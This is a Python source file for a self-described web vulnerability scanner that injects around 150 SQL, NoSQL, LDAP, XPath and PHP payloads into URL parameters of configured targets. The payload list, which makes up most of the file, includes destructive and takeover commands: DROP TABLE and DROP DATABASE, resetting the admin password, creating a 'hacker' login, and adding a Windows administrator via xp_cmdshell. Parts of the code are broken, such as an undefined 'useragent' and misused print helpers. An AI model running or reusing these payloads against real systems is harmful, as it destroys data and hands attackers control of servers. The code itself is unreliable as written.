import re
import requests
import os
import time
import json
import threading
import sys
import colorama
import platform
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urlsplit, urlunsplit, parse_qs, urlencode
from colorama import init, Fore, Style

# Proje kök dizinini belirle
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))

# setting.json dosya yolu
SETTING_PATH = os.path.join(BASE_DIR, 'config', 'setting.json')

# setting.json dosyasını kontrol et ve oku
if not os.path.exists(SETTING_PATH):
    print(f"{Fore.RED}[ERROR] setting.json file not found at: {SETTING_PATH}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Please make sure the file exists in the config directory{Style.RESET_ALL}")
    exit(1)

try:
    with open(SETTING_PATH, 'r', encoding='utf-8') as f:
        setting = json.load(f)
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load setting.json: {str(e)}{Style.RESET_ALL}")
    exit(1)

# Ayarlardan gerekli değerleri al
TARGET_FILE_PATH = setting.get("TARGET_FILE_PATH")
TARGET = setting.get("TARGET")
TARGET_FILE_CHECK = setting.get("TARGET_FILE_CHECK", "off").lower()
request_timeout = setting.get('request_timeout', 10)

# Proje kök dizinini Python'un modül arama yoluna ekle
if BASE_DIR not in sys.path:
    sys.path.append(BASE_DIR)

init(autoreset=True)
    
# Global variables
vulnerable = []
not_vulnerable = []
scan_stats = {
    'total_tested': 0,
    'vulnerable': 0,
    'start_time': time.time(),
    'errors': 0
    }

# Directory and file paths
SCAN_RESULTS_DIR = "scan_results"
LOG_DIR = "log/sql_inj"
SCAN_RESULTS_FILE = os.path.join(SCAN_RESULTS_DIR, "mini_sqli_scanner.txt")
LOG_FILE = os.path.join(LOG_DIR, "mini_sqli_scanner_log.txt")

class VulnDetector:
    def __init__(self):
        self.detection_patterns = {
            'MySQL': [
                r"SQL syntax.*MySQL", 
                r"Warning.*mysql_.*", 
                r"valid MySQL result", 
                r"MySqlClient\.",
                r"com\.mysql\.jdbc\.exceptions",
                r"MySQL server version for the right syntax",
                r"check the manual that corresponds to your MySQL server version"
            ],
            'PostgreSQL': [
                r"PostgreSQL.*ERROR", 
                r"Warning.*\Wpg_.*", 
                r"valid PostgreSQL result", 
                r"Npgsql\.",
                r"org\.postgresql\.util\.PSQLException",
                r"ERROR:\s\ssyntax error at or near"
            ],
            'MicrosoftSQLServer': [
                r"Driver.* SQL[\-\_\ ]*Server", 
                r"OLE DB.* SQL Server", 
                r"(\W|\A)SQL Server.*Driver", 
                r"Warning.*mssql_.*", 
                r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", 
                r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", 
                r"(?s)Exception.*\WRoadhouse\.Cms\.",
                r"System\.Data\.SqlClient\.SqlException",
                r"Unclosed quotation mark after the character string"
            ],
            'MicrosoftAccess': [
                r"Microsoft Access Driver", 
                r"JET Database Engine", 
                r"Access Database Engine",
                r"Microsoft Office Access Database Engine",
                r"ODBC Microsoft Access Driver"
            ],
            'Oracle': [
                r"\bORA-[0-9][0-9][0-9][0-9]", 
                r"Oracle error", 
                r"Oracle.*Driver", 
                r"Warning.*\Woci_.*", 
                r"Warning.*\Wora_.*",
                r"oracle\.jdbc\.driver",
                r"SQL command not properly ended"
            ],
            'IBMDB2': [
                r"CLI Driver.*DB2", 
                r"DB2 SQL error", 
                r"\bdb2_\w+\(",
                r"DB2 SQL Error:"
            ],
            'SQLite': [
                r"SQLite/JDBCDriver", 
                r"SQLite.Exception", 
                r"System.Data.SQLite.SQLiteException", 
                r"Warning.*sqlite_.*", 
                r"Warning.*SQLite3::", 
                r"\[SQLITE_ERROR\]",
                r"SQLite3::SQLException"
            ],
            'Sybase': [
                r"(?i)Warning.*sybase.*", 
                r"Sybase message", 
                r"Sybase.*Server message.*",
                r"Sybase.*error"
            ]
        }
        
    def content_check(self, content):
        for db_type, patterns in self.detection_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return True, db_type
        return False, None

def generate_payloads(param, value):
    payloads = [
        # 150 payload
        f"{param}='",
        f"{param}=' OR '1'='1",
        f"{param}=' OR '1'='1' --",
        f"{param}=1 OR 1=1",
        f"{param}=1' OR '1'='1'#",
        f"{param}='; WAITFOR DELAY '0:0:5'--",
        f"{param}=1;SELECT SLEEP(5)",
        f"{param}=1 AND 1=CONVERT(int,@@version)",
        f"{param}=1 AND 1=1 UNION SELECT 1,2,3,4,5,6--",
        f"{param}=1 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
        f"{param}=1'--",
        f"{param}=1'#",
        f"{param}=1'/*",
        f"{param}=1'/*!50000",
        f"{param}=1'/**/",
        f"{param}=1' AND SLEEP(5)--",
        f"{param}=1' AND BENCHMARK(10000000,MD5(1))--",
        f"{param}=1' AND (SELECT * FROM (SELECT(SLEEP(5)))XYZ)--",
        f"{param}=1' OR (SELECT 1 FROM (SELECT SLEEP(5))abc)--",
        f"{param}=1' WAITFOR DELAY '0:0:5'--",
        f"{param}=1' AND GTID_SUBSET(@@version,0)--",
        f"{param}=1' AND EXTRACTVALUE(1,CONCAT(0x5C,@@version))--",
        f"{param}=1' AND UPDATEXML(1,CONCAT(0x5C,@@version),1)--",
        f"{param}=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        f"{param}=1' UNION SELECT 1--",
        f"{param}=1' UNION SELECT 1,2--",
        f"{param}=1' UNION SELECT 1,2,3--",
        f"{param}=1' UNION SELECT 1,2,3,4--",
        f"{param}=1' UNION SELECT 1,2,3,4,5--",
        f"{param}=1' UNION SELECT NULL,NULL,NULL,NULL--",
        f"{param}=1' UNION SELECT @@version,NULL,NULL,NULL--",
        f"{param}=1' UNION SELECT user(),NULL,NULL,NULL--",
        f"{param}=1' UNION SELECT database(),NULL,NULL,NULL--",
        f"{param}=1' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables--",
        f"{param}=1' AND 1=1--",
        f"{param}=1' AND 1=2--",
        f"{param}=1' AND ASCII(SUBSTRING(@@version,1,1))>0--",
        f"{param}=1' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'--",
        f"{param}=1'; DROP TABLE users--",
        f"{param}=1'; CREATE TABLE test (id INT)--",
        f"{param}=1'; INSERT INTO test VALUES (1)--",
        f"{param}=1'; UPDATE users SET password='hacked' WHERE username='admin'--",
        f"{param}=1'; SHOW TABLES--",
        f"{param}=1' AND LOAD_FILE('/etc/passwd')--",
        f"{param}=1' INTO OUTFILE '/tmp/test.txt'--",
        f"{param}=1' INTO DUMPFILE '/tmp/test.txt'--",
        f"{param}=1' AND IF(1=1,SLEEP(5),0)--",
        f"{param}=1' AND IF(ASCII(SUBSTRING(@@version,1,1))>0,SLEEP(5),0)--",
        f"{param}=1' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>0,SLEEP(5),0)--",
        f"{param}[$ne]=1",
        f"{param}[$gt]=1",
        f"{param}[$lt]=1",
        f"{param}[$regex]=^a",
        f"{param}[$where]=1",
        f"{param}=' or 1=1 or ''='",
        f"{param}=' and count(/*)=1 or ''='",
        f"{param}=' and string-length(name(/*[1]))=4 or ''='",
        f"{param}=*)(objectClass=*",
        f"{param}=*)(|(objectClass=*",
        f"{param}=admin)(&)",
        f"{param}=*)(uid=*))(|(uid=*",
        f"{param}=;phpinfo();",
        f"{param}=';system('whoami');//",
        f"{param}=';eval($_GET['cmd']);//",
        f"{param}=1'||'1'='1",
        f"{param}=1' or '1'='1",
        f"{param}=1' xor 1=1--",
        f"{param}=1' and not 1=2--",
        f"{param}=1' or not 1=2--",
        f"{param}=1' and 1 like 1--",
        f"{param}=1' or 1 like 1--",
        f"{param}=1' and 1 between 0 and 2--",
        f"{param}=1' or 1 between 0 and 2--",
        f"{param}=1' and 1 in (0,1,2)--",
        f"{param}=1' or 1 in (0,1,2)--",
        f"{param}=%27%20OR%201=1--",
        f"{param}=%27%20UNION%20SELECT%201,2,3--",
        f"{param}=1%27%20AND%201=CONVERT(int,@@version)--",
        f"{param}=1'%00",
        f"{param}=1' AND 1=1%00",
        f"{param}=1' UNION SELECT 1,2,3%00",
        f"{param}=1'%0AAND%0A1=1--",
        f"{param}=1'%0D%0AUNION%0D%0ASELECT%0D%0A1,2,3--",
        f"{param}=1'\" OR 1=1--",
        f"{param}=1'\" AND 1=CONVERT(int,@@version)--",
        f"{param}=1'\" UNION SELECT 1,2,3--",
        f"{param}=1'<xml>1</xml> OR 1=1--",
        f"{param}=1'<xml>1</xml> UNION SELECT 1,2,3--",
        f"{param}=MScgT1IgJzEnPScx",
        f"{param}=MScgVU5JT04gU0VMRUNUIDEsMiwz--",
        f"{param}=0x27204f52202731273d2731",
        f"{param}=0x2720554e494f4e2053454c45435420312c322c33--",
        f"{param}=1' aNd 1=1--",
        f"{param}=1' uNiOn sElEcT 1,2,3--",
        f"{param}=1' sEleCt * fRoM users--",
        f"{param}=1'     AND     1=1--",
        f"{param}=1'     UNION     SELECT     1,2,3--",
        f"{param}=1') OR ('1'='1",
        f"{param}=1') AND 1=CONVERT(int,@@version)--",
        f"{param}=1') UNION SELECT 1,2,3--",
        f"{param}=1')) OR (('1'='1",
        f"{param}=1';SELECT 1;--",
        f"{param}=1';SELECT * FROM users;--",
        f"{param}=1';SELECT * FROM users WHERE username='admin';--",
        f"{param}=1';EXEC xp_cmdshell('whoami');--",
        f"{param}=1';EXEC master..xp_cmdshell 'whoami';--",
        f"{param}=1';EXEC('SELECT * FROM users');--",
        f"{param}=1' AND (SELECT @@servername)='server'--",
        f"{param}=1' AND (SELECT db_name())='master'--",
        f"{param}=1' AND (SELECT user_name())='dbo'--",
        f"{param}=1' AND (SELECT TOP 1 table_name FROM information_schema.tables)='users'--",
        f"{param}=1' AND (SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users')='username'--",
        f"{param}=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        f"{param}=1' AND (SELECT ASCII(SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1)))>0--",
        f"{param}=1' AND (SELECT LEN(table_name) FROM information_schema.tables WHERE table_schema='dbo' AND table_name LIKE 'user%')>0--",
        f"{param}=1' AND (SELECT CAST(@@version AS INT))=1--",
        f"{param}=1'; DECLARE @q VARCHAR(100); SET @q='SELECT 1'; EXEC(@q);--",
        f"{param}=1'; DECLARE @q VARCHAR(100); SET @q='SELECT * FROM users'; EXEC(@q);--",
        f"{param}=1' AND (SELECT name FROM master..sysdatabases WHERE dbid=1)='master'--",
        f"{param}=1' AND (SELECT name FROM sysobjects WHERE xtype='U')='users'--",
        f"{param}=1' AND (SELECT password FROM users WHERE username='admin')='5f4dcc3b5aa765d61d8327deb882cf99'--",
        f"{param}=1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
        f"{param}=1' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%')>0--",
        f"{param}=1' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND LEN(password)>5)>0--",
        f"{param}=1' AND CHAR(65)=CHAR(65)--",
        f"{param}=1' AND CONVERT(VARCHAR(10),@@version) LIKE '%SQL%'--",
        f"{param}=1' AND @@version LIKE '%SQL%'--",
        f"{param}=1' AND 1=1 AND 'a'='a'",
        f"{param}=1' OR 1=1 OR 'a'='a'",
        f"{param}=1' XOR 1=1 XOR 'a'='a'",
        f"{param}=1' AND 1+1=2--",
        f"{param}=1' AND 2-1=1--",
        f"{param}=1' AND 2*2=4--",
        f"{param}=1' AND 4/2=2--",
        f"{param}=1' AND CONCAT('a','b')='ab'--",
        f"{param}=1' AND SUBSTRING('abc',1,1)='a'--",
        f"{param}=1' AND LEN('abc')=3--",
        f"{param}=1' AND REVERSE('abc')='cba'--",
        f"{param}=1' AND GETDATE()>DATEADD(day,-1,GETDATE())--",
        f"{param}=1' AND DATEDIFF(day,'2020-01-01',GETDATE())>0--",
        f"{param}=1' AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1--",
        f"{param}=1' AND IIF(1=1,1,0)=1--",
        f"{param}=1' AND (SELECT COUNT(*) FROM users GROUP BY username)>0--",
        f"{param}=1' AND (SELECT MAX(id) FROM users)>0--",
        f"{param}=1' AND (SELECT MIN(id) FROM users)>0--",
        f"{param}=1' AND (SELECT AVG(id) FROM users)>0--",
        f"{param}=1' AND (SELECT SUM(id) FROM users)>0--",
        f"{param}=1' AND (SELECT 1 FROM users WHERE id=1)=1--",
        f"{param}=1' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
        f"{param}=1' AND (SELECT username FROM users WHERE id=1)='admin'--",
        f"{param}=1' AND (SELECT u.username FROM users u WHERE u.id=1)='admin'--",
        f"{param}=1' AND (SELECT COUNT(*) FROM users u, information_schema.tables t)>0--",
        f"{param}=1'; BACKUP DATABASE master TO DISK='C:\\backup.bak'--",
        f"{param}=1'; DROP DATABASE test--",
        f"{param}=1'; CREATE DATABASE test--",
        f"{param}=1'; CREATE LOGIN hacker WITH PASSWORD='12345'--",
        f"{param}=1'; ALTER LOGIN sa WITH PASSWORD='newpassword'--",
        f"{param}=1'; GRANT ALL TO hacker--",
        f"{param}=1'; EXEC xp_cmdshell 'net user hacker P@ssw0rd /add'--",
        f"{param}=1'; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--",
        f"{param}=1'; EXEC xp_cmdshell 'dir C:\\'--",
        f"{param}=1'; EXEC xp_cmdshell 'type C:\\windows\\win.ini'--",
        f"{param}=1' AND 1=1 /*!50000AND*/ 'a'='a",
        f"{param}=1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
        f"{param}=1' /*!50000OR*/ 1=1--",
        f"{param}=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        f"{param}=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ]
    return payloads

def test_parameter(url, param, original_value):
    parsed = urlsplit(url)
    query = parse_qs(parsed.query, keep_blank_values=True)
    
    for payload in generate_payloads(param, original_value):
        try:
            query[param] = [payload]
            new_query = urlencode(query, doseq=True)
            new_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_query, parsed.fragment))
            
            start_time = time.time()
            response = requests.get(
                new_url,
                headers={'User-agent': useragent.get_useragent()},
                timeout=request_timeout,
                allow_redirects=False
            )
            response_time = time.time() - start_time
            
            vulner = VulnDetector()
            is_vulnerable, db_type = vulner.content_check(response.text)
            
            if is_vulnerable or response_time > 5:
                if response_time > 5:
                    db_type = db_type or "Time-based detection"
                return True, db_type, payload
                
        except Exception as e:
            scan_stats['errors'] += 1
            continue
            
    return False, None, None

def VulnCheck(url):
    if "=" not in url:
        not_vulnerable.append(url)
        return
        
    try:
        parsed = urlsplit(url)
        if not parsed.query:
            not_vulnerable.append(url)
            return
            
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        for param in params:
            for value in params[param]:
                is_vulnerable, db_type, payload = test_parameter(url, param, value)
                if is_vulnerable:
                    result = {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'db_type': db_type,
                        'type': 'Error-based' if 'Time-based' not in db_type else 'Time-based',
                        'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
                    }
                    vulnerable.append(result)
                    colorprint()
                    print(
                        f"Vulnerable: {url}\n"
                        f"Parameter: {param}\n"
                        f"Payload: {payload}\n"
                        f"DB Type: {db_type}\n"
                        f"Type: {'Error-based' if 'Time-based' not in db_type else 'Time-based'}\n"
                        "----------------------------------------",
                        "v"
                    )
                    return
                    
        not_vulnerable.append(url)
        scan_stats['total_tested'] += 1
        
    except Exception as e:
        scan_stats['errors'] += 1
        colorprint()
        print(f"Error testing {url}: {str(e)}", "e")

def create_directories():
    """Create required directories if they don't exist"""
    if not os.path.exists(SCAN_RESULTS_DIR):
        os.makedirs(SCAN_RESULTS_DIR)
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

def save_results():
    """Save results to files"""
    create_directories()
    
    # Save vulnerable results to scan_results file
    if vulnerable:
        with open(SCAN_RESULTS_FILE, "w") as f:
            for vuln in vulnerable:
                f.write(json.dumps(vuln) + "\n")
    
    # Save all logs (both vulnerable and not vulnerable)
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"\n\n=== Scan started at {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        
        # Write vulnerable results
        log_file.write("\nVULNERABLE TARGETS:\n")
        for vuln in vulnerable:
            log_file.write(f"URL: {vuln['url']}\n")
            log_file.write(f"Parameter: {vuln['parameter']}\n")
            log_file.write(f"Payload: {vuln['payload']}\n")
            log_file.write(f"DB Type: {vuln['db_type']}\n")
            log_file.write(f"Type: {vuln['type']}\n")
            log_file.write(f"Timestamp: {vuln['timestamp']}\n")
            log_file.write("----------------------------------------\n")
        
        # Write non-vulnerable results
        log_file.write("\nNON-VULNERABLE TARGETS:\n")
        for url in not_vulnerable:
            log_file.write(f"{url}\n")
        
        # Write scan statistics
        elapsed_time = time.time() - scan_stats['start_time']
        log_file.write("\nSCAN STATISTICS:\n")
        log_file.write(f"Total tested: {scan_stats['total_tested']}\n")
        log_file.write(f"Vulnerable found: {len(vulnerable)}\n")
        log_file.write(f"Errors encountered: {scan_stats['errors']}\n")
        log_file.write(f"Scan duration: {elapsed_time:.2f} seconds\n")

def get_targets():
    """Get targets based on settings"""
    targets = []
    
    if setting.get('TARGET_FILE_CHECK', 'off').lower() == "on":
        if os.path.exists(TARGET_FILE_PATH):
            with open(TARGET_FILE_PATH, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        else:
            colorprint.colorprint(f"Target file not found: {TARGET_FILE_PATH}", "e")
            exit(1)
    else:
        if setting.get('TARGET'):
            targets = [setting.get('TARGET')]
        else:
            colorprint.colorprint("No target specified in setting.json", "e")
            exit(1)
    
    return targets

def VulnMain():
    targets = get_targets()
    if not targets:
        colorprint.colorprint("No targets to scan", "w")
        return
    
    colorprint.colorprint(f"Starting scan of {len(targets)} targets", "i")
    
    # Using ThreadPoolExecutor for better thread management
    with ThreadPoolExecutor(max_workers=setting.get('max_workers', 10)) as executor:
        executor.map(VulnCheck, targets)
    
    # Save results
    save_results()
    
    # Print summary
    elapsed_time = time.time() - scan_stats['start_time']
    colorprint.colorprint(
        f"\nScan completed in {elapsed_time:.2f} seconds\n"
        f"Total tested: {scan_stats['total_tested']}\n"
        f"Vulnerable found: {len(vulnerable)}\n"
        f"Errors encountered: {scan_stats['errors']}",
        "i"
    )

def colorprint():
    
    current_os = platform.system()
    os.system('cls' if current_os == "Windows" else 'clear')

logo = r"""
+----------------------------------------------------+
|                                                    |
|                                                    |
|   _____                       ___        ______    |
|  |  ___|   _ ____  ____   ___| \ \      / / ___|   |
|  | |_ | | | | __ \| __ \ / _ \ |\ \ /\ / /\___ \   |
|  |  _|| |_| | | | | | | |  __/ | \ V  V /  ___) |  |
|  |_|   \____|_| |_|_| |_|\___|_|  \_/\_/  |____/   |
|                                                    |
|                                                    |
+----------------------------------------------------+
"""

print(Fore.RED + logo + Fore.RESET)
print("[*]\tFunnelWS Web Vulnerability Scanner")
print("[*]\tFunnelWS Version BETA_1.002\n")
print("======================================================\n")


if __name__ == "__main__":
    VulnMain()
